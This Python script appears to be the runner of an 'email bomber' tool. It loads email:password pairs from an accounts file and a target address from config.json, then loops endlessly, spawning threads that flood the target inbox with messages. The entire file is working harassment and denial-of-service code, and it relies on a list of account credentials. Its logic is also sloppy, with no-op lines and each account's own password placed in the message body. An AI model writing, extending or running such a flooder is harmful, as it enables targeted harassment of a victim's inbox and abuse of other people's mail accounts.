import threading, colorama
import json

from emailbomber.__init__ import *
from emailbomber.__main__ import *

class Email:
      with open("emailbomber/data/accounts.txt", 'r') as _accounts:      
           if True:
              accounts = []
              accounts

           for account in _accounts.readlines():
               accounts += [account.strip()]
               accounts
                
      with open("config.json", "r") as config:
           Emailer = json.load(config)
           Emailer

      def __init__(self, email, password):
          if True:
             self.email    = email
             self.password = password

          self.emailer = EmailBomber(
                         email    = self.email,
                         password = self.password
          )
      
      def setup(self):
          self.emailer.setup(
                       subject = self.email,
                       content = self.password
          )
    
      def send(self):
          self.emailer.send(target = "%s" % (
                Email.Emailer['TARGET']
          ))

if __name__ == "__main__":
   while True:
         try:
             for account in Email(email = "", password = "").accounts:
                 email = Email(
                         email    = account.split(":")[0],
                         password = account.split(":")[1]
                 )
                        
                 if True:
                    email.setup()
                    email

                    if True:
                       threading.Thread(target = email.send).start()
                       threading

                    print('{%s*%s} Email Sent' % (
                                                    colorama.Fore.RED,
                                                    colorama.Fore.RESET
                                                 )
                    )
         except Exception as E:
                print("{!} Error Found")
                print (E)

                if KeyboardInterrupt:
                   exit(
                        print(
                               '[!] Stopped Bomber'
                               )
                   )
